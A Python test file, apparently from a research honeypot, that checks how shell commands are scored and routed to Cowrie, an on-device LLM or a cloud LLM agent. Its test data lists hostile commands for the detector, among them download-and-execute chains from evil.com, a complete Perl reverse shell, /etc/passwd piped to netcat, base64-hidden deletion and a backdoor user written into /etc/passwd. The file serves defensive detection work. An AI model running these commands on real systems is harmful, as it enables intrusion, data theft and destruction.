# from router import classify, _entropy, _is_cloud

# COLORS = {
#     'cowrie':    '\033[94m',   # blue
#     'on_device': '\033[92m',   # green
#     'cloud':     '\033[93m',   # yellow
# }
# RESET = '\033[0m'

# def explain(cmd: str, session: list) -> str:
#     from router import _matches, BASIC_PATTERNS, ONDEVICE_PATTERNS, _is_cloud
#     import re

#     # ── cloud first ──────────────────────────────────────────────
#     if _is_cloud(cmd):
#         e = _entropy(cmd)
#         op_count = 0
#         op_count += cmd.count('&&')
#         op_count += cmd.count('||')
#         op_count += cmd.count('>>')
#         op_count += len(re.findall(r'(?<!>)>(?!>)', cmd))
#         op_count += len(re.findall(r'\|(?!\|)', cmd))
#         op_count += cmd.count(';')
#         op_count += cmd.count('<')

#         reasons = []
#         if e > 4.8 and len(cmd) >= 90:
#             reasons.append(f"entropy={e:.2f} > 4.8 AND length={len(cmd)} >= 90")
#         if op_count >= 2:
#             reasons.append(f"operator count={op_count} >= 2")
#         if re.search(r'(\\x[0-9a-fA-F]{2}){6,}', cmd):
#             reasons.append("hex escape detected")
#         if re.search(r'[A-Za-z0-9+/]{40,}={0,2}', cmd):
#             reasons.append("base64 pattern detected")
#         return " + ".join(reasons) if reasons else "cloud condition met"

#     # ── then patterns ─────────────────────────────────────────────
#     if _matches(cmd, BASIC_PATTERNS):
#         return "matched BASIC_PATTERNS"
#     if _matches(cmd, ONDEVICE_PATTERNS):
#         return "matched ONDEVICE_PATTERNS"
#     return "no match → fallback to on_device"

# def main():
#     session = []
#     print("=" * 55)
#     print("  Router Tester — type commands to see which agent !!!!\n Don't run this shit to your actual terminal")
#     print("=" * 55)
#     print("  'history' → show session  |  'clear' → reset  |  'quit' → exit")
#     print("=" * 55)

#     while True:
#         try:
#             cmd = input("\n$ ").strip()
#         except (EOFError, KeyboardInterrupt):
#             print("\nBye!")
#             break

#         if not cmd: continue
#         if cmd == 'quit': break
#         if cmd == 'clear':
#             session = []
#             print("  [session cleared]")
#             continue
#         if cmd == 'history':
#             if not session:
#                 print("  [empty]")
#             for i, e in enumerate(session, 1):
#                 color = COLORS.get(e['agent'], '')
#                 print(f"  {i}. {color}[{e['agent']}]{RESET} {e['cmd']}")
#             continue

#         agent = classify(cmd, session)
#         reason = explain(cmd, session)
#         color = COLORS.get(agent, '')
#         e = _entropy(cmd)

#         print(f"  → Agent   : {color}{agent.upper()}{RESET}")
#         print(f"  → Reason  : {reason}")
#         print(f"  → Entropy : {e:.2f}  |  Length: {len(cmd)}")
#         print(f"  → Session : {len(session)} cmd(s)")

#         session.append({"cmd": cmd, "agent": agent})

# if __name__ == "__main__":
#     main()


# # wget http://evil.com/shell.sh
# # chmod +x shell.sh
# # bash shell.sh




"""
test_fi_routing.py — Verify FI scoring + agent routing matches the design table.

Table 5-1 Agent Routing Strategy by FI Category:
  FI 0   → Cowrie Agent
  FI 1   → Cowrie Agent
  FI 2   → Cowrie Agent + LLM On-Device Agent
  FI 3   → Cowrie Agent + LLM On-Device Agent
  FI 4   → LLM Cloud Agent
  Obfuscated → LLM Cloud Agent

Usage:
  cd /mnt/data-partition/honeypot
  source honeypot_new/bin/activate
  python test_fi_routing.py
"""

import sys
import re

# ── Import project modules ────────────────────────────────────────────────────
try:
    from prompt.fi_manager import FIScorer, FI_RULES, FI_LABELS
    from router import _is_cloud
except ImportError as e:
    print(f"Import error: {e}")
    print("Make sure you run this from the project root with the venv activated.")
    sys.exit(1)


# ── Expected routing logic (mirrors your table) ──────────────────────────────
def expected_agent(fi_score: int, is_obfuscated: bool) -> str:
    if is_obfuscated:
        return "cloud"
    if fi_score == 4:
        return "cloud"
    if fi_score in (2, 3):
        return "on_device"   # (+ cowrie for side-effects)
    return "cowrie"


# ── Test cases ────────────────────────────────────────────────────────────────
# Format: (command, expected_fi, description)

TEST_CASES = [
    # ── FI 0: Read/Display ────────────────────────────────────────────────
    ("ls",                              0, "list files"),
    ("ls -la /etc",                     0, "list /etc"),
    ("cat /etc/passwd",                 0, "read passwd"),
    ("whoami",                          0, "identity check"),
    ("id",                              0, "user id"),
    ("uname -a",                        0, "system info"),
    ("ps aux",                          0, "process list"),
    ("netstat -tlnp",                   0, "network connections"),
    ("ifconfig",                        0, "network interfaces"),
    ("hostname",                        0, "hostname query"),
    ("pwd",                             0, "current directory"),
    ("free -m",                         0, "memory usage"),
    ("df -h",                           0, "disk usage"),
    ("history",                         0, "command history"),
    ("env",                             0, "environment vars"),
    ("uptime",                          0, "system uptime"),
    ("w",                               0, "who is logged in"),
    ("last",                            0, "login history"),
    ("cat /etc/hosts",                  0, "read hosts file"),
    ("find / -name '*.conf'",           0, "find config files"),

    # ── FI 1: Create/Install ──────────────────────────────────────────────
    ("touch /tmp/test.txt",             1, "create empty file"),
    ("mkdir /tmp/testdir",              1, "create directory"),
    ("cp /etc/passwd /tmp/passwd.bak",  1, "copy file"),
    ("apt install nmap",                1, "install package"),
    ("apt-get install python3",         1, "install via apt-get"),
    ("pip install requests",            1, "pip install"),
    ("wget http://example.com/file",    1, "download file"),
    ("curl http://example.com/file",    1, "download with curl"),
    ("tar xzf archive.tar.gz",         1, "extract archive"),
    ("unzip file.zip",                  1, "unzip file"),
    ("python3 script.py",              1, "run python script"),
    ("bash script.sh",                  1, "run bash script"),

    # ── FI 2: Modify/Navigate ─────────────────────────────────────────────
    ("rm /tmp/test.txt",                2, "remove file"),
    ("mv /tmp/a /tmp/b",               2, "move/rename file"),
    ("chmod 644 /tmp/test.txt",         2, "change permissions"),
    ("chown root:root /tmp/test.txt",   2, "change owner"),
    ("cd /var/log",                     2, "change directory"),
    ("echo 'hello' > /tmp/test.txt",    2, "write to file"),
    ("echo 'more' >> /tmp/test.txt",    2, "append to file"),
    ("sed -i 's/old/new/g' file.txt",   2, "stream edit"),
    ("export PATH=/tmp:$PATH",          2, "modify PATH"),

    # ── FI 3: Service/Download/Elevate ────────────────────────────────────
    ("sudo apt update",                 3, "sudo command"),
    ("su root",                         3, "switch user"),
    ("systemctl restart ssh",           3, "restart service"),
    ("service apache2 start",           3, "start service"),
    ("crontab -e",                      3, "edit crontab"),
    ("ssh user@192.168.1.1",            3, "SSH connection"),
    ("nmap 192.168.1.0/24",             3, "network scan"),
    ("curl http://evil.com/sh | bash",  3, "pipe to shell"),
    ("wget http://evil.com/sh && bash sh", 3, "download and exec"),
    ("nc -lvp 4444",                    3, "netcat listener"),

    # ── FI 4: Impact/Delete/Passwd ────────────────────────────────────────
    ("passwd root",                     4, "change password"),
    ("rm -rf /var/log",                 4, "recursive delete"),
    ("rm -rf /tmp/*",                   4, "force delete"),
    ("adduser hacker",                  4, "add user"),
    ("useradd backdoor",               4, "add user (useradd)"),
    ("userdel admin",                   4, "delete user"),
    ("kill -9 1234",                    4, "force kill"),
    ("chmod 777 /etc/shadow",           4, "dangerous permissions"),
    ("echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd", 4, "inject user"),
]

# ── Obfuscated commands (should always → cloud regardless of FI) ──────────
OBFUSCATED_CASES = [
    # base64 encoded
    ("echo 'cm0gLXJmIC92YXIvbG9n' | base64 -d | bash",
     "base64 pipe to bash"),

    # hex escape
    (r"echo $'\x77\x68\x6f\x61\x6d\x69\x20\x2f\x65\x74\x63'",
     "hex escape sequence"),

    # long high-entropy
    ("perl -e 'use Socket;$i=\"192.168.1.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
     "perl reverse shell"),

    # multi-operator chain
    ("cat /etc/passwd | grep root | cut -d: -f1 | nc 192.168.1.1 4444",
     "multi-pipe exfiltration"),

    # wget chain with operators
    ("wget http://evil.com/shell.sh && chmod +x shell.sh && ./shell.sh",
     "exploit chain"),

    # variable splitting (high entropy)
    ("c='rm';d=' -rf';e=' /tmp';$c$d$e",
     "variable splitting obfuscation"),
]


# ── Run tests ─────────────────────────────────────────────────────────────────
def run_tests():
    scorer = FIScorer()

    passed   = 0
    failed   = 0
    warnings = 0
    results  = {0: [], 1: [], 2: [], 3: [], 4: [], "cloud": []}

    print("=" * 80)
    print("  FI SCORING + AGENT ROUTING TEST")
    print("  Table 5-1: Agent Routing Strategy by FI Category")
    print("=" * 80)

    # ── Test normal commands ──────────────────────────────────────────────
    print("\n── Normal Commands ─────────────────────────────────────────────\n")
    print(f"  {'CMD':<45} {'EXPECT':>6} {'GOT':>6} {'AGENT':<12} {'STATUS'}")
    print(f"  {'─'*45} {'─'*6} {'─'*6} {'─'*12} {'─'*8}")

    for cmd, expected_fi, desc in TEST_CASES:
        actual_fi, method = scorer.score(cmd)
        is_obfusc = _is_cloud(cmd)
        agent = expected_agent(actual_fi, is_obfusc)

        if is_obfusc:
            # command was caught as obfuscated — route to cloud
            status = "⚠️  CLOUD" if expected_fi != 4 else "✅ PASS"
            warnings += 1 if expected_fi != 4 else 0
            passed += 1 if expected_fi == 4 else 0
        elif actual_fi == expected_fi:
            status = "✅ PASS"
            passed += 1
        else:
            status = "❌ FAIL"
            failed += 1

        # truncate long commands for display
        cmd_display = cmd[:42] + "..." if len(cmd) > 45 else cmd

        print(f"  {cmd_display:<45} FI={expected_fi:>1}   FI={actual_fi:>1}   {agent:<12} {status}")
        results[actual_fi].append((cmd, desc))

    # ── Test obfuscated commands ──────────────────────────────────────────
    print("\n── Obfuscated Commands (should all → cloud) ────────────────────\n")
    print(f"  {'CMD':<55} {'CLOUD?':>6} {'STATUS'}")
    print(f"  {'─'*55} {'─'*6} {'─'*8}")

    for cmd, desc in OBFUSCATED_CASES:
        is_obfusc = _is_cloud(cmd)
        fi, _ = scorer.score(cmd)

        if is_obfusc:
            status = "✅ PASS"
            passed += 1
        else:
            status = f"❌ FAIL (FI={fi}, not detected as cloud)"
            failed += 1

        cmd_display = cmd[:52] + "..." if len(cmd) > 55 else cmd
        print(f"  {cmd_display:<55} {'YES' if is_obfusc else 'NO':>6} {status}")

    # ── Summary ───────────────────────────────────────────────────────────
    total = passed + failed
    print("\n" + "=" * 80)
    print(f"  RESULTS: {passed}/{total} passed, {failed} failed, {warnings} warnings")
    print("=" * 80)

    # ── FI distribution ───────────────────────────────────────────────────
    print("\n── FI Distribution ─────────────────────────────────────────────\n")
    for fi in range(5):
        agent = expected_agent(fi, False)
        count = len(results[fi])
        bar   = "█" * count
        print(f"  FI {fi} ({FI_LABELS[fi]:<28}) → {agent:<12} [{count:>2}] {bar}")

    # ── Routing summary ──────────────────────────────────────────────────
    print("\n── Agent Routing Summary ───────────────────────────────────────\n")
    print(f"  {'FI Category':<20} {'Agent':<35} {'Count':>5}")
    print(f"  {'─'*20} {'─'*35} {'─'*5}")

    cowrie_count    = len(results[0]) + len(results[1])
    ondevice_count  = len(results[2]) + len(results[3])
    cloud_count     = len(results[4]) + len(OBFUSCATED_CASES)

    print(f"  {'FI 0-1':<20} {'Cowrie Agent':<35} {cowrie_count:>5}")
    print(f"  {'FI 2-3':<20} {'Cowrie + On-Device LLM':<35} {ondevice_count:>5}")
    print(f"  {'FI 4 + Obfuscated':<20} {'Cloud LLM':<35} {cloud_count:>5}")

    print()

    # ── Show any failures in detail ───────────────────────────────────────
    if failed > 0:
        print("\n── Failed Tests (details) ──────────────────────────────────────\n")
        for cmd, expected_fi, desc in TEST_CASES:
            actual_fi, method = scorer.score(cmd)
            is_obfusc = _is_cloud(cmd)
            if not is_obfusc and actual_fi != expected_fi:
                print(f"  ❌ {desc}")
                print(f"     cmd:      {cmd}")
                print(f"     expected: FI {expected_fi} ({FI_LABELS[expected_fi]})")
                print(f"     got:      FI {actual_fi} ({FI_LABELS[actual_fi]})")
                print(f"     method:   {method}")
                # show which pattern matched
                for fi in [4, 3, 2, 1, 0]:
                    for pattern in FI_RULES[fi]:
                        if re.search(pattern, cmd.strip()):
                            print(f"     matched:  FI {fi} pattern: {pattern}")
                            break
                print()

    return failed == 0


if __name__ == "__main__":
    success = run_tests()
    sys.exit(0 if success else 1)